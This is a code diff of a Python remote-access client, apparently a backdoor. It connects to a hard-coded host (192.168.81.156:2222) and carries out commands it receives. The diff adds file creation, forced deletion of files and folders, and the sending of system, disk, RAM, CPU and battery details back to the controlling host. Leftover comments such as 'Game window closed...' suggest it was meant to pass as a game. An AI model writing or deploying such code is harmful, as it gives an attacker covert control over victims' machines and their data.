@@ -1,7 +1,10 @@
 import socket as st
-import os,shutil
-import importlib.util
+import os
+import shutil
 import platform
+import psutil
+import importlib
+import stat
 # from colorama import Fore, Style
 
 def get_system_information():
@@ -12,7 +15,9 @@ def get_system_information():
         elif getBuildNumber >= 22000:
             os_name = 'Windows 11'
         else:
-            os_name = None
+            os_name = 'Windows'
+
+    curr_ram = psutil.virtual_memory().total // pow(1024,3)
     return """
     {}\n
     Device name : {}
@@ -21,8 +26,15 @@ def get_system_information():
     Architecture : {}
     Machine : {}
     Processor : {}
-    Core : {}\n\n
+    Core : {}
+    Battery : {}%\n\n
+    {}\n
+    Disk Usage : {}
+    Disk partitions : {}
+    RAM : {}
+    CPU usage : {}\n\n
     {}
+    Network interfaces : {}
     """.format(
         'SYSTEM INFORMATION'.center(150),
         os_name,
@@ -32,12 +44,41 @@ def get_system_information():
         platform.machine(),
         platform.processor(),
         os.cpu_count(),
-        
-    )
+        psutil.sensors_battery(),
+        'DISK INFORMATION'.center(150),
+        psutil.disk_usage(os.getcwd()),
+        psutil.disk_partitions(),
+        curr_ram,
+        psutil.cpu_percent(),
+        'NETWORK INFORMATION'.center(150),
+        "hello"
+    ).encode()
+
+def create_thing(get_cmd,sock):
+    file_type = get_cmd.split()[1]
+    file_or_folder = get_cmd.split()[2]
+    
+    if file_type == 'file':
+        try:
+            with open(file_or_folder,'w') as f:
+                f.write('')
+            sock.send(b'the file \'{}\' created at target successfully')
+        except Exception as err:
+            sock.send(str(err).encode())
+    
+    elif file_type == 'folder':
+        try:
+            os.makedirs(file_or_folder)
+            sock.send(b'the file \'{}\' created at target successfully')
+        except Exception as err:
+            sock.send(str(err).encode())
+
+    else:
+        print('will write help for touch command')
 
 def main():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
-    sock.connect(('127.0.0.1', 7777))
+    sock.connect(('192.168.81.156',2222))
 
     while True:
         get_cmd = sock.recv(1024).decode().strip()
@@ -51,8 +92,11 @@ def main():
                 os.chdir(_dir)  
                 sock.send(b"Directory changed successfully\n")
 
+            elif get_cmd.startswith('touch '):
+                create_thing(get_cmd,sock)
+
             elif get_cmd == 'sysinfo':
-                pass
+                sock.send(get_system_information())
 
             elif get_cmd.startswith('which '):
                 get_exec = get_cmd.split()[1]
@@ -62,16 +106,16 @@ def main():
             elif get_cmd.startswith('rm '):
                 file_name = get_cmd.split()[1]
                 if os.path.exists(file_name):
+                    os.chmod(file_name,stat.S_IWRITE)
                     os.remove(file_name)
                     sock.send('The file \'{}\' removed successfully'.format(file_name).encode())
                 else:
                     sock.send('The file \'{}\' doesnt exist'.format(file_name).encode())
 
-            # elif get_cmd
-
             elif get_cmd.startswith('rmdir '):
                 folder_name = get_cmd.split()[1]
                 if os.path.exists(folder_name):
+                    os.chmod(folder_name,stat.S_IWRITE)
                     shutil.rmtree(folder_name)
                     sock.send('The folder \'{}\' removed successfully'.format(folder_name).encode())
                 else:
@@ -117,18 +161,19 @@ def main():
         
         except ConnectionResetError:
             sock.close()
+            break
 
     sock.close()
     # os.system('clear')
     # print('Game window closed...')
 
-def configureApp():
-    os.system('python3 -m venv env')
-    os.system('source env/bin/activate')
-    packs = ['tk','socket','sys','os']
-    for lst_pk in packs:
-        if importlib.util.find_spec(lst_pk) is not None:
-            print('{} is installed'.format(lst_pk))
-        else:
-            os.system('pip install {}'.format(lst_pk))
+def check_dependencies():
+    dependencies = ['sys','os','shutil','platform','os','colorama','psutil']
+
+    for dep in dependencies:
+        try:
+            importlib.import_module(dep)
+            print('installed')
+        except:
+            os.system('python -m pip install {}'.format(dep))
 
